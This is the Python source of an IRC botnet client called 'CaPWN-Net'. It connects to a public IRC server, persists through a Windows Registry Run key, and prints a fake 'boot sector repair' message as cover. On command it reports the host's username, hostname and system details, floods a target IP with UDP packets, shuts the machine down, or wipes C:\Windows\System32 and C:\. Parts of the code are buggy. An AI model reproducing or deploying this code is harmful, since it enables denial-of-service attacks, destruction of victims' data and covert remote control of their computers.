#!/usr/bin/python3
import socket
import platform
import winsound
import sys
import time
import os
import getpass
import shutil
import psutil
import random
import struct
import winreg


#     ____             ________  ____              ___         ___      ___
#    6MMMMb/           `MMMMMMMb.`Mb(      db      )d' `MM\     `M'         `MM\     `M'
#   8P    YM            MM    `Mb YM.     ,PM.     ,P   MMM\     M           MMM\     M           /
#  6M      Y     ___    MM     MM `Mb     d'Mb     d'   M\MM\    M           M\MM\    M   ____   /M
#  MM          6MMMMb   MM     MM  YM.   ,P YM.   ,P    M \MM\   M           M \MM\   M  6MMMMb /MMMMM
#  MM         8M'  `Mb  MM    .M9  `Mb   d' `Mb   d'    M  \MM\  M           M  \MM\  M 6M'  `Mb MM
#  MM             ,oMM  MMMMMMM9'   YM. ,P   YM. ,P     M   \MM\ M           M   \MM\ M MM    MM MM
#  MM         ,6MM9'MM  MM          `Mb d'   `Mb d'     M    \MM\M  MMMMMMM  M    \MM\M MMMMMMMM MM
#  YM      6  MM'   MM  MM           YM,P     YM,P      M     \MMM           M     \MMM MM       MM
#   8b    d9  MM.  ,MM  MM           `MM'     `MM'      M      \MM           M      \MM YM    d9 YM.  ,
#    YMMMM9   `YMMM9'Yb_MM_           YP       YP      _M_      \M          _M_      \M  YMMMM9   YMMM9
#
#




# TO-DO list:

# Changes in last update:

ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server = "chat.freenode.net" # Server
channel = "#CaPWN-Net" # Channel
datestring = time.strftime("%X")

username = getpass.getuser()
hostname = socket.gethostname()


## Global variables from Niels
# Setting up a small 'Config' section
program_name = "IRC_Bot"
# Defining the location of the Run folder in the registry
run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
# __VARNAME__ variables are built-in variables carrying valuable information
# Getting the path of the current script and the path of python executable
script_path = os.path.realpath(__file__)
python_path = sys.executable
full_command = python_path + " \"" + script_path + '"'

Platforminfo = platform.system()
Platforminfo2 = platform.release()
Platforminfo3 = "Z"
Platforminfo4 = "6"

if Platforminfo == "Windows":
    Platforminfo3 = "W"

if Platforminfo2 == "10":
    Platforminfo4 = "10"

if Platforminfo2 == "7":
    Platforminfo4 = "7"

if Platforminfo2 == "8.1":
    Platforminfo4 = "8"

## Sets our bot nickname based on a combination of information about the host system.

os_string = Platforminfo3 + Platforminfo4 + " " + hostname + username
valid_irc_name = ""
for character in os_string:
    if character.isalnum():
        valid_irc_name += character
botnick = valid_irc_name





# Connect to the IRC server
ircsock.connect((server, 6667))
ircsock.send(bytes("USER "+ botnick +" "+ botnick +" "+ botnick + " " + botnick + "\n", "UTF-8"))
ircsock.send(bytes("NICK "+ botnick +"\n", "UTF-8")) # assign the nick to the bot


def start_at_boot():
    # Creating a handle (key) in the HKEY Current user tree of the windows registry
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS)

    # We execute the function defined below to check whether the key we're about
    # to make exists.
    if registry_key_exists(key, program_name):
        print("Key already exists, exiting...")
        return
    else:
        print("Key doesn't exist.")

    # If the program didn't exit then we need to create the key.
    try:
        print("Attempting to create key...")
        # With this function we create a key under the Run directory in the registry.
        # This'll create a key with the program name and the path of the current script.
        winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, full_command)
    except WindowsError:
        # If a WindowsError is raised that probably means we don't have the permission to
        # create a registry key. Try running the program as administrator.
        print("Unable to create startup key. Try running as administrator.")

def remove_start_at_boot():
    # Creating a handle (key) in the HKEY Current user tree of the windows registry
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_ALL_ACCESS)

    # We execute the function defined below to check whether the key we're about
    # to make exists.
    if registry_key_exists(key, program_name):
                print("Key exists attempting to remove")

                try:
                    winreg.DeleteKeyEx(key, program_name)
                except WindowsError:
                    # If this fails try executing as administrator
                    print("Couldn't remove key")
    else:
                print("Key doesn't exists")

def registry_key_exists(key_object, sub_key):
        # Returns True if key exists, otherwise return False

        try:
            # Starting a try-catch block wherein I attempt to open the value
            # of given key. If this doesn't exist the function will raise
            # a WindowsError exception.
            winreg.QueryValueEx(key_object, sub_key)
        except WindowsError:
            # If a WindowsError exception is raised the key does not exists
            # and thus we return False
            return False

        # If we arrive at this point of the function it means that we
        # didn't return anything yet. That means opening the value key
        # must have succeeded, since the except block didn't get executed,
        # which means that it exists. And thus we return True
        return True


def regedit_timestamp():
    # Creating a file with the current timestamp in order to prove this application started just at boot
    file_path = os.environ["HOMEPATH"] + "\\Desktop\\"
    file_name = str(time.time()) + ".tmp"
    full_file = file_path + file_name
    print("Creating a file with the name: " + file_name)
    file = open(full_file, "w+")
    file.close()



# respond to server Pings.
def ping():
  global ircsock
  ircsock.send(bytes("PONG :pingis\n", "UTF-8"))


# sends messages to the target.
# SHOULD THIS BE REMOVED?

def sendmsg(msg, target=channel):
  ircsock.send(bytes("PRIVMSG "+ target +" :"+ msg +"\n", "UTF-8"))



def fakemsg():
    print(hostname + "_" + username + " has joined CaPWN-Net. Waiting for commands...")
    print("Windows Critical Operation - Repairing Boot Sector Fragmentation")
    print("audit(1216470015.9668:2): policy loaded auid=4294967925 ses=42994967295")
    print("INIT: version 2.86 boot sector 1")
    print("Starting udev:                                   [OK]")
    print("Loading default keymap (us):                     [OK]")
    print("Setting hostname update.windows.com              [OK]")
    print("No devices found")
    print("Setting up Logical Volume Management:")
    print("     No volume groups found")
    print("Checking filesystems")
    print("/: clean, 4871/263232 files, 72321/263056 blocks")
    print("/: clean, 4952/263232 files, 83208/263056 blocks")
    print("/: clean, 5987/263232 files, 84301/263056 blocks")
    print("/: clean, 6450/263232 files, 98735/263056 blocks")
    print("/: clean, 8287/263232 files, 110200/263056 blocks")
    print("/: clean, 10002/263232 files, 145240/263056 blocks")
    print("/: clean, 58305/263232 files, 187234/263056 blocks")
    print("/: clean, 97024/263232 files, 201782/263056 blocks")
    print("/: clean, 123762/263232 files, 231803/263056 blocks")
    print("/: clean, 189243/263232 files, 626305/263056 blocks")
    print("/: clean, 263232/263232 files, 626305/263056 blocks")
    print("Remounting root filesystem in read-write mode:   [OK]")
    print("Mounting local filesystems:                      [OK]")
    print("Enabling local filesystem quote:                 [OK]")
    print("Test Passed. Windows Critical Operation Manager has resolved fragmentation.")


# join channel(s).
def joinchan(chan):
  ircsock.send(bytes("JOIN "+ chan +"\n", "UTF-8"))
  ircmsg = ""
  while ircmsg.find("End of /NAMES list.") == -1:
    ircmsg = ircsock.recv(2048).decode("UTF-8")
    ircmsg = ircmsg.strip('\n\r')
    print(ircmsg)


vport = 80
duration = 1


def usage():
    print("Usage: " + sys.argv[0] + " <ip> <port> <second>")
    # sendmsg("Usage: " + sys.argv[0] + " <ip> <port> <second>")


def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0

    while 1:
        if ircmsg.find("stop_ddos") != -1:
            break
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print("Attacking target. %s packages sent from %s via port %s " % (sent, victim, vport))
        # sendmsg("Attacking %s sent packages %s at the port %s "%(sent, victim, vport))

        ## /end of DDOS


## for DDOS function
print(len(sys.argv))
if len(sys.argv) != 4:
    usage()
else:
    flood(victim, port, duration)


def main():
  start_at_boot()
  regedit_timestamp()
  joinchan(channel)
  fakemsg()
  sendmsg(hostname + "_" + username + " has joined CaPWN-Net. Waiting for commands...")
  while 1:
      ircmsg = ircsock.recv(2048).decode("UTF-8")
      ircmsg = ircmsg.strip('\n\r')
      print(ircmsg)
      if ircmsg.find("PING :") != -1:
          ping()

      ## DDOS



      ## help
      if ircmsg.find("bot_help") != -1:
          sendmsg("Welcome to CaPWN-Net. The following commands are supported:")
          sendmsg("BOT MANAGEMENT COMMANDS")
          sendmsg("whois - Prints OS, version, hostname, and username.")
          sendmsg("shutdown + botname - Shuts down the specified Bot.")
          sendmsg("shutdown all - Shuts down every Bot in the server.")
          sendmsg("start_ddos - Starts a DDOS with default values.")
          sendmsg("psutil - Prints all possible hardware statistics including RAM usage, CPU usage, disk usage, temperature, battery level, fan speed, Windows users.  ")

      ## psutil functions
      if ircmsg.find("psutil") != -1:
          sendmsg("CPU Count: " + str(psutil.cpu_count()))
          sendmsg("CPU %: " + str(psutil.cpu_percent()))
          sendmsg("Disk Usage: " + str(psutil.disk_usage("C:\\")))
          sendmsg("RAM Usage: " + str(psutil.swap_memory()))
          sendmsg("Users: " + str(psutil.users()))

      ## def main download_file  (NEEDS WORK)

      ## test path to BotStubExe  (NEEDS WORK)
      #if ircmsg.startswith("!path") != -1:
       #   mypath = os.path.realpath
        #  name = '46584.png'
         # find_files(name, mypath)


      ## kill - kills the host computer (NEEDS WORK)
      if ircmsg.find("kill " + botnick) != -1:
          shutil.rmtree('C:\\Windows\\System32\\', ignore_errors = True)
          shutil.rmtree('C:\\', ignore_errors = True)


      ## whois - identifies all basic information about bot host.
      if ircmsg.find("whois") != -1:
              sendmsg("I am running " + platform.system() + " " + platform.release() + ".")
              sendmsg("My hostname is " + hostname + " and my username is " + username + ".")
              sendmsg("My processor name is " + platform.processor())

      ## ddos_t - sets a target for DDoS
      if ircmsg.find("ddos_setting") != -1:
          msg = ircmsg.split()
          victim = msg[1:]
          port = msg[2:]
          duration = msg[3:]
          flood(victim,port,duration)


      ## ddos function
      if ircmsg.find("start_ddos") != -1:
          victim = "192.168.0.89"
          vport = 80
          duration = 60
          flood(victim, vport, duration)


      ## shutdown all - shuts down every bot in the server.
      if ircmsg.find("shutdown all") != -1:
              sendmsg("Shutting down...    :(")
              os.system('shutdown -s')

      ## shutdown - shuts down specific bot by nickname.
      if ircmsg.find("shutdown " + botnick) != -1:
          sendmsg(botnick + " is shutting down.")
          os.system('shutdown -s')


      if ircmsg.find("PRIVMSG") != -1:
          name = ircmsg.split('!', 1)[0][1:]
          message = ircmsg.split('PRIVMSG', 1)[1].split(':', 1)[1]
          if len(name) < 17:
              if ircmsg.find("PING :") != -1:
                      ping()

main()